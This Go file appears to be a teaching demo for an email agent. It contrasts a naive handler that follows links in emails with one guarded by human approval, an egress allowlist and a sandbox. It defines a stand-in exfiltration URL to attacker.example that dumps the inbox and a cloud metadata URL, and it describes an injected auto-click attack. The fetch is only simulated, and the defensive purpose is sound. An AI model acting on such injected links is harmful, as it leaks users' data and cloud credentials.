// Command main is the runnable demo for lesson 13.5, action links.
//
// Run it with:
//
//	go run .
//
// An action link is the sharpest thing an email can carry: a URL it wants acted
// on. Acting on one is where the human gate, the egress policy, and the sandbox
// fetch all meet. A naive agent that just follows the link lets an email exfiltrate
// data or reach the cloud metadata service. The agent requires a human to approve
// the exact action, checks the URL against the egress allowlist, and only then
// fetches it inside the sandbox. Deterministic, no model.
package main

import (
	"fmt"
	"net"
	"os"
	"strings"

	"github.com/t0ul/emaildrop/pkg/hitl"
	"github.com/t0ul/emaildrop/pkg/netpolicy"
)

func main() {
	undef := attackLandsUndefended()
	def := stackRefuses()
	fmt.Println()
	if undef && def {
		fmt.Println("attack blocked (the receipt): a naive agent follows an exfil or metadata link; the agent requires a human to approve the exact action, checks the URL against the egress allowlist, and only fetches an approved, allowlisted link in the sandbox")
	} else {
		fmt.Println("a control did not hold")
		os.Exit(1)
	}
}

// ---- the links, and the fetch that leaves the host ----

const (
	exfilURL    = "http://attacker.example/collect?inbox=dump" // send data out
	imdsURL     = "http://169.254.169.254/latest/meta-data/"   // reach cloud metadata
	legitURL    = "http://calendar.school.example/rsvp/42"     // a real RSVP the owner wants
	legitMarker = "RSVP"
)

// wentOut records every URL actually fetched: an action link's whole danger is
// that fetching it moves data or reaches somewhere it should not.
var wentOut []string

// vmFetch stands in for the real sandboxed fetch (controlplane ExecuteFetch ->
// the MicroVM): the request leaves only from inside the chamber, never the host.
func vmFetch(url string) { wentOut = append(wentOut, url) }

// ---- before: follow the link ----

// actNaive is the obvious action handler: the email has a link, so fetch it.
func actNaive(url string) { vmFetch(url) }

// ---- after: human gate, then egress policy, then sandbox ----

// actGuarded acts on a link only when a human approved THIS action (echoing the
// nonce shown with the evidence) and the URL passes the egress allowlist. Only
// then does the fetch run, inside the sandbox.
func actGuarded(req hitl.Request, echoedNonce string, pol netpolicy.Policy, url string) (bool, string) {
	if ok, err := req.Confirm(echoedNonce, true); !ok {
		return false, errStr(err) // the gate names itself in its error
	}
	if err := pol.Check(url); err != nil {
		return false, errStr(err) // so does the policy
	}
	vmFetch(url)
	return true, "fetched in sandbox"
}

// ---- the policy, and the oracle ----

func errStr(e error) string {
	if e == nil {
		return "refused"
	}
	return e.Error()
}

func sentExfilOrInternal() bool {
	for _, u := range wentOut {
		if strings.Contains(u, "attacker.example") || strings.Contains(u, "169.254.169.254") {
			return true
		}
	}
	return false
}

// pol is the egress allowlist: only the school calendar host is permitted out.
func pol() netpolicy.Policy {
	return netpolicy.Policy{
		Allow:   []string{"calendar.school.example"},
		Resolve: func(string) ([]net.IP, error) { return []net.IP{net.ParseIP("93.184.216.34")}, nil }, // a public IP
	}
}

// ---- the attack, against the naive handler and against the stack ----

func attackLandsUndefended() bool {
	fmt.Println("== before: the agent follows the link ==")
	wentOut = nil
	for _, u := range []string{exfilURL, imdsURL} {
		actNaive(u)
	}
	landed := sentExfilOrInternal()
	fmt.Printf("  what left the machine: %v\n", wentOut)
	fmt.Printf("  action-link-exfil ASR: %d%% (%d/2)\n", pct(len(wentOut), 2), len(wentOut))
	return landed && len(wentOut) == 2
}

func stackRefuses() bool {
	fmt.Println("\n== after: human gate, egress policy, sandbox ==")
	wentOut = nil
	p := pol()

	// 1. An injected auto-click: no human saw the evidence, so no nonce to echo.
	req1 := hitl.NewRequest("Open link from newsletter", "source: newsletter.txt")
	_, r1 := actGuarded(req1, "", p, exfilURL) // empty nonce
	fmt.Printf("  auto-click (no human):        refused: %s\n", r1)

	// 2. A human approves, but the link exfiltrates to a non-allowlisted host.
	req2 := hitl.NewRequest("Open link from newsletter", "source: newsletter.txt")
	_, r2 := actGuarded(req2, req2.Nonce(), p, exfilURL)
	fmt.Printf("  approved, exfil host:         refused: %s\n", r2)

	// 3. A human approves, but the link reaches the cloud metadata service.
	req3 := hitl.NewRequest("Open link from newsletter", "source: newsletter.txt")
	_, r3 := actGuarded(req3, req3.Nonce(), p, imdsURL)
	fmt.Printf("  approved, metadata host:      refused: %s\n", r3)

	leaked := sentExfilOrInternal()
	fmt.Printf("  action-link-exfil ASR: %d%% (%d/2)\n", pct(countBad(), 2), countBad())

	// A genuine RSVP the owner approves, to an allowlisted host, still goes through.
	req4 := hitl.NewRequest("RSVP to the field trip", "source: trip.txt")
	okLegit, r4 := actGuarded(req4, req4.Nonce(), p, legitURL)
	fmt.Printf("  genuine RSVP (approved, allowlisted): %v (%s)\n", okLegit, r4)

	return !leaked && okLegit
}

// ---- helpers ----

func countBad() int {
	n := 0
	for _, u := range wentOut {
		if strings.Contains(u, "attacker.example") || strings.Contains(u, "169.254.169.254") {
			n++
		}
	}
	return n
}

func pct(n, d int) int { return n * 100 / d }
